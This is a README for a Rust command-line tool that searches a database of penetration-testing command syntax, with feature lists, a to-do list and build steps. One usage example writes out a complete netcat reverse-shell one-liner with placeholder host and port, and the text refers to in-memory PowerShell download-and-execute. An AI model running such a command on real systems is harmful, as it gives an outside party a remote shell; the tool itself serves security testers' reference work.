
The goal of this project is to create an easier to use and updated replacement for [RTFM](https://github.com/leostat/rtfm) or something to run in the terminal that works like [Rev Shells](https://revshells.com/) or the [HackTools](https://addons.mozilla.org/en-US/firefox/addon/hacktools/) browser plugin. This started as a project to help improve my proficiency with Rust. I'm still new to it so I'm sure there are some poor Rust coding practices but I will be refactoring the code as I go.  I'm currently using the sqlite database that [RTFM](https://github.com/leostat/rtfm) uses but that needs some updating and new syntax needs to be added since that hasn't been touched in almost 6 years.  

My current usage of this is to have it running in a tmux pane and when I need the syntax for something like downloading a file from my local machine and then executing that in memory via powershell then I can just ctrl+r in the CLI, type something like IEX or powershell, and then select the syntax I need via the arrow keys.  Pressing return on the hightlighted command will then copy that command to the clipboard.  So instead of searching through my notes or opening a web browser, I can stay in the terminal and quickly copy/paste the command I need via the RedOx CLI.  

## Working Features
- Ctrl+r to dynamically search the RTFM database for commands as you type and display those in a selectable list.  Works similarly to using Ctrl+r to search through terminal history.
- Ctrl+h to display a history of previously selected commands from the current session in a selectable list. 
- up/down arrow keys to highlight a command from the current search or from the history. Pressing return copies that command to the clipboard.  
- 'info' displays full information on the currently selected command.  'full information' is very sparse at the moment.  
- 'add -c <command>' to add a new command to the database.  optional: -d to add a comment/description with the command.
- 'update <column> <content>' to update a database column of the currently selected command, which are 'command','comment' and 'author'.  The ID of the active command is display in the prompt. Examples: 'update comment spawn a pty via python3', 'update author greg scharf', 'update command rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LHOST] [LPORT] >/tmp/f'.  

## Currently Working On
- 'set' command for variable replacement when selecting a command that has placeholders for LHOST, LPORT, etc.
- In 'info' show variables that need to be set and their value if they are set.
- Need to do some sed magic on the database build files to make variable names consistent and then rebuild the database.

## To Add
- [ ] Set variables in the CLI to automatically replace placeholders in commands for things like Remote Host, Local Host, Local Port, etc similar to msfconsole.  
    - Need to standardize the naming of placeholders that are already in the RTFM database because sometimes the local host IP is represented as [me],[IP],[LHOST] or [lip].
- [ ] Add config file to store user set variables and other as yet to be determined configurations.
    - This might be the place for related commands that are often used together. Add ability to save the commands in the current history.  Would need a way to quickly delete a command in the current history e.g. highlight the command and then Ctrl+d to remove it. Also need to be able to completely clear the current history.  User would also need to supply a name for the history before it is saved to the config file.  These would be stored as an array of row IDs from TblCommand. Use the 'config' crate to facilitate this.  
- [ ] Add 'env' command to display all variables set in the user's config file
- [ ] Ctrl+d while in selectable list deletes the item from the database, or if in history mode, deletes the item from the current history.
- [ ] Make use of tags already implemented in the database to display selectable list of grouped items. For example, 'reverse shells linux' to display all commands in the database grouped under that tag.  tags already in the database are probably a little too general to be useful e.g. 'bash', 'windows'.  Also need a function to display all tags in the database as a selectable list.
- [x] Add ability to update the database columns of the currently selected command.
- [x] Display command's comment and any other info after it has been selected.
- [x] Add a history feature, ctrl+h or type 'history' to show a selectable list of previously copied commands.
- [x] Show currently selected command in prompt, type info to show all columns to allow for easier updating of the database within the CLI.
- [ ] Implement [RTFM](https://github.com/leostat/rtfm)'s solution for creating/updating the database
- [ ] Update the database with newer commands for things like Bloodhound,ffuf,feroxbuster,Rubeus,Crackmapexec,Chisel,SSHuttle, etc.
- [ ] Add a better method for generating help content with the prettytable crate.
- [ ] Allow selection mode to wrap up or down
- [ ] Add search capability for text based/markdown notes.    
    - Root directory for user's notes will be supplied in a CLI variable.
- [ ] Use pre-existing 'refs' table to link to markdown notes and display notes in terminal when selected... there is probably a crate to display markdown.

## To Fix
- [ ] 5-26-23: Clean up code again before it becomes too unruly.
- [x] Termion inconsistent colors between Arch and Ubuntu.
- [ ] Add buffer to scroll through result output that doesn't fit within terminal windows.
- [x] Handle error when output exceeds terminal window so application doesn't crash on Arch.
    - Needs a much better solution
- [ ] Issues with Termion when attempting to build a Windows executable.
- [ ] Termion screen refresh on MAC M1 causes screen to flicker when arrowing through commands.

## Build

### Linux
Issue encountered when building on Ubuntu 20.04: linker failed and the only fix was to install the following packages.
```bash
sudo apt install libxcb1-dev libxcb-render0-dev libxcb-shape0-dev libxcb-xfixes0-dev
```


### Windows
**Note**: Windows builds are not currently working because of an issue I need to resolve related to the Termion crate.
Build Windows executable on linux
```
sudo apt install mingw-w64

rustup target add x86_64-pc-windows-gnu
```

In ~/.cargo/config (create this file if it doesnt' exits) add the following lines
```
[target.x86_64-pc-windows-gnu]
linker = "x86_64-w64-mingw32-gcc"
```

```bash
cargo build --target x86_64-pc-windows-gnu
```



